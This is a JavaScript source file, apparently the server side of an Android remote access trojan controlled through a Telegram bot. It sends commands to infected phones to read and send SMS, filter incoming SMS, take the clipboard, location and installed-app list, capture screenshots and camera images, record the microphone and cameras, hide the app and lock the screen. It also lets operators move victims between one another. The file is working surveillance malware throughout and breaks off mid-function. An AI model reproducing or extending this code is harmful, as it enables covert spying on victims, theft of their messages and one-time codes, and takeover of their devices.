const { ObjectoriesLikeToGetFucked } = require("./objectories");

const oltg = new ObjectoriesLikeToGetFucked();
let sym = "𓏺|𓏺";

class theHandler {
    constructor(UserTransformData){
        this.udt = UserTransformData;
        this.accepted_users = [];
        this.accepted_ports = [];
    }

    async getUsersByPort(portname, password, callback = () => {}){
        let found_users = [];
        for (let user of this.accepted_users){
            if (user.port.name == portname && user.port.password == password){
                found_users.push({
                    command: `/sign_${user.device_id}`,
                    accessory: user.access,
                    device_id: user.device_id,
                    socket: user.socket
                });
            }
        }

        callback({
            status: true,
            users: found_users,
            method: "getUsers"
        })
    }

    async getSafeUsersByPort(portname, password, callback = () => {}){
        let found_users = [];
        for (let user of this.accepted_users){
            if (user.port.name == portname && user.port.password == password){
                found_users.push({
                    command: `/sign_${user.device_id}`,
                    accessory: user.access,
                    device_id: user.device_id
                });
            }
        }

        callback({
            status: true,
            users: found_users,
            method: "getUsers"
        })
    }

    async getUserByDeviceId(portname, password, devid, callback = () => {}){
        await this.getUsersByPort(portname, password, async (allusers) => {
            for (let user of allusers.users){
                if (user.device_id == devid){
                    callback({
                        status: true,
                        user: user,
                        method: "getUserByDeviceId",
                    });
                    return;
                }
            }
            callback({
                status: false,
                method: "getUserByDeviceId",
                message: "USER_NOT_FOUND",
            });
        })
    }

    async getSafeUserByDeviceId(portname, password, devid, shortcut, callback = () => {}){
        await this.getSafeUsersByPort(portname, password, async (allusers) => {
            for (let user of allusers.users){
                if (user.device_id == devid){
                    callback({
                        status: true,
                        user: user,
                        method: "getUserByDeviceId",
                        device_id: devid,
                        shortcut: shortcut
                    });
                    return;
                }
            }
            callback({
                status: false,
                method: "getUserByDeviceId",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
        })
    }

    async openUrl(portname, passname, devid, url, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;
            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "openUrl",
                    message: "USER_NOT_FOUND",
                    device_id: devid,
                    shortcut: shortcut
                });
                return;
            }
            
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "openUrl",
                url: url,
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async vibratePhone(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;

            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "vibratePhone",
                    message: "USER_NOT_FOUND",
                    device_id: devid,
                    shortcut: shortcut
                });
                return;
            }
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "vibratePhone",
                shortcut: shortcut
            }));
            
            callback({
                status: true
            });
        })
    }

    async sendToast(portname, passname, devid, toast, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;
            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "sendToast",
                    message: "USER_NOT_FOUND",
                    device_id: devid,
                    shortcut: shortcut
                });
                return;
            }
            
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "sendToast",
                toast: toast,
                shortcut: shortcut
            }));
            
            callback({
                status: true
            });
        })
    }

    async getGeoLocation(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;
            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "getGeoLocation",
                    message: "USER_NOT_FOUND",
                    device_id: devid,
                    shortcut: shortcut
                });
                return;
            }
            
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "getGeoLocation",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async sendAllSMS(portname, passname, devid, sms, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;
            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "sendAllSMS",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }
            
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "sendAllSMS",
                sms: sms,
                shortcut: shortcut
            }));
            
            callback({
                status: true
            });
        })
    }

    async lockScreen(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "lockScreen",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "lockScreen",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async unlockScreen(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "unlockScreen",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "unlockScreen",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async sendSMS(portname, passname, devid, sms, tonumber, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;
            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "sendSMS",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }
            
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "sendSMS",
                sms: sms,
                tonumber: tonumber,
                shortcut: shortcut
            }));

            
            callback({
                status: true
            });
        })
    }

    async setSMSFilter(portname, passname, devid, filter_number, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;
            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "setSMSFilter",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }
            
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "setSMSFilter",
                filter_number: filter_number,
                shortcut: shortcut
            }));

            
            callback({
                status: true
            });
        })
    }

    async removeSMSFilter(portname, passname, devid, filter_number, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            let found = null;
            if (user.status == true){
                found = user.user;
            }

            if (found == null){
                callback({
                    status: false,
                    method: "removeSMSFilter",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }
            
            found.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "removeSMSFilter",
                filter_number: filter_number,
                shortcut: shortcut
            }));

            
            callback({
                status: true
            });
        })
    }

    async getInstalledApps(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "getInstalledApps",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "getInstalledApps",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async setSoundVolume(portname, passname, devid, volume, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "setSoundVolume",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "setSoundVolume",
                volume: volume,
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async getClipboard(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "getClipboard",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "getClipboard",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async getAllSMS(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "getAllSMS",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "getAllSMS",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async takeScreenshot(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "takeScreenshot",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "takeScreenshot",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async takeFrontshot(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "takeFrontshot",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "takeFrontshot",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async takeBackshot(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "takeBackshot",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "takeBackshot",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async recordFront(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "recordFront",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "recordFront",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async recordBack(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "recordBack",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "recordBack",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async recordMicrophone(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "recordMicrophone",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "recordMicrophone",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async hideApp(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "hideApp",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "hideApp",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async unhideApp(portname, passname, devid, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "unhideApp",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "unhideApp",
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async changeIcon(portname, passname, devid, icon, shortcut, callback = () => {}){
        await this.getUserByDeviceId(portname, passname, devid, async (user) => {
            if (user.status == false){
                callback({
                    status: false,
                    method: "changeIcon",
                    message: "USER_NOT_FOUND",
                    device_id: devid
                });
                return;
            }

            user.user.socket.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "changeIcon",
                icon: icon,
                shortcut: shortcut
            }));

            callback({
                status: true
            });
        })
    }

    async changePortPassword(portname, passname, newpassword, id, callback = () => {}){
        await this.getUsersByPort(portname, passname, async (allusers) => {
            let nums = 0;
            for (let user of allusers.users){
                user.socket.write(JSON.parse({
                    port: portname,
                    password: passname,
                    new_password: newpassword,
                    method: "changePortPassword"
                }))
                nums += 1;
            }
            callback({
                status: true,
                changed_users: nums,
                from: passname,
                to: newpassword
            });
            await this.udt.changePassword(id, newpassword)
        })
    }

    async changeUsersOwning(portname, passname, newport, newpassword, userslength, callback = () => {}){
        await this.getUsersByPort(portname, passname, async (allusers) => {
            if (userslength > allusers.users.length){
                callback({
                    status: false,
                    message: "NOT_ENOUGH_USERS"
                });
                return;
            }
            let nums = 0;
            for (let user of allusers.users){
                user.socket.write(JSON.parse({
                    port: portname,
                    password: passname,
                    new_password: newpassword,
                    net_port: newport,
                    method: "changeUsersOwning"
                }))
                nums += 1;
            }
            callback({
                status: true,
                changed_users: nums,
                from: {
                    port: portname,
                    password: passname
                },
                to: {
                    port: newport,
                    password: newpassword
                }
            });
        })
    }

    async addUserToAcceptedPorts(objectNeedToPush){
        this.accepted_ports.push(objectNeedToPush);
        return true;
    }

    async addUser(objectNeedToPush){
        this.accepted_users.push(objectNeedToPush);
        return true;
    }

    async handleRemote(socket, message, bot){
        if (message.method == "getUsers"){
            await this.getSafeUsersByPort(message.port, message.password, async (allusers) => {
                socket.write(JSON.stringify(allusers));
            })
        } else if (message.method == "getUserByDeviceId"){
            await this.getSafeUserByDeviceId(message.port, message.password, message.device_id, message.shortcut, async (user) => {
                if (user.status == false && user.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                } else {
                    socket.write(JSON.stringify(user));
                }
            })
        } else if (message.method == "openUrl"){
            await this.openUrl(message.port, message.password, message.device_id, message.url, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "vibratePhone"){
            await this.vibratePhone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "sendToast"){
            await this.sendToast(message.port, message.password, message.device_id, message.toast, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "getGeoLocation"){
            await this.getGeoLocation(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "sendAllSMS"){
            await this.sendAllSMS(message.port, message.password, message.device_id, message.sms, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "sendSMS"){
            await this.sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "getInstalledApps"){
            await this.getInstalledApps(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "setSoundVolume"){
            await this.setSoundVolume(message.port, message.password, message.device_id, message.volume, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "getClipboard"){
            await this.getClipboard(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "takeScreenshot"){
            await this.takeScreenshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "takeFrontshot"){
            await this.takeFrontshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "takeBackshot"){
            await this.takeBackshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "recordBack"){
            await this.recordBack(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "recordFront"){
            await this.recordFront(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "recordMicrophone"){
            await this.recordMicrophone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "setSMSFilter"){
            await this.setSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "removeSMSFilter"){
            await this.removeSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "hideApp"){
            await this.hideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "unhideApp"){
            await this.unhideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "changeIcon"){
            await this.changeIcon(message.port, message.password, message.device_id, message.icon, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "getAllSMS"){
            await this.getAllSMS(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "changePortPassword"){
            await this.changePortPassword(message.port, message.password, message.new_password, message.shortcut.msgowner, async (dt) => {
                message.shortcut.edit == false ? await bot.sendMessage(
                    message.shortcut.chat_id,
                   oltg.build(`⚡ ${sym} new password seted for your users\n\n📪 ${sym} old pass: ${dt.from}\n🌉 ${sym} new pass: ${dt.to}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                ) : await bot.editMessageText(
                   oltg.build(`⚡ ${sym} new password seted for your users\n\n📪 ${sym} old pass: ${dt.from}\n🌉 ${sym} new pass: ${dt.to}`),
                    {
                        message_id: message.shortcut.message_id,
                        chat_id: message.shortcut.chat_id
                    }
                )
            })
        } else if (message.method == "changeUsersOwning"){
            await this.changeUsersOwning(message.port, message.password, message.new_port, message.new_password, message.userslength, async (dt) => {
                if (dt.status){
                    let date = new Date();
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build(`➕ ${sym} ${message.userslength} users were moved\n\n💠 ${sym} from `) + `${message.port} & ${message.password}` +oltg.build(`\n\n🛠 ${sym} to `)+ `${message.new_port} & ${message.new_password}` +oltg.build(`\n\n⌚ ${sym} ${date.getUTCFullYear()}/${date.getUTCMonth()}/${date.getUTCDay()} - ${date.getUTCHours()}:${date.getUTCMinutes()}:${date.getUTCSeconds()}:${date.getUTCMilliseconds()}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build(`➕ ${sym} ${message.userslength} users were moved\n\n💠 ${sym} from `) + `${message.port} & ${message.password}` +oltg.build(`\n\n🛠 ${sym} to `)+ `${message.new_port} & ${message.new_password}` +oltg.build(`\n\n⌚ ${sym} ${date.getUTCFullYear()}/${date.getUTCMonth()}/${date.getUTCDay()} - ${date.getUTCHours()}:${date.getUTCMinutes()}:${date.getUTCSeconds()}:${date.getUTCMilliseconds()}`),
                        {
                            message_id: message.shortcut.message_id,
                            chat_id: message.shortcut.chat_id
                        }
                    )
                } else {
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build(`🔴 ${sym} users of `) + `${message.port}` +oltg.build(` is not enough to change owning`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build(`🔴 ${sym} users of `) + `${message.port}` +oltg.build(` is not enough to change owning`),
                        {
                            message_id: message.shortcut.message_id,
                            chat_id: message.shortcut.chat_id
                        }
                    )
                }
            })
        } else if (message.method == "lockScreen"){
            await this.lockScreen(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        } else if (message.method == "unlockScreen"){
            await this.unlockScreen(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                    message.shortcut.edit == false ? await bot.sendMessage(
                        message.shortcut.chat_id,
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
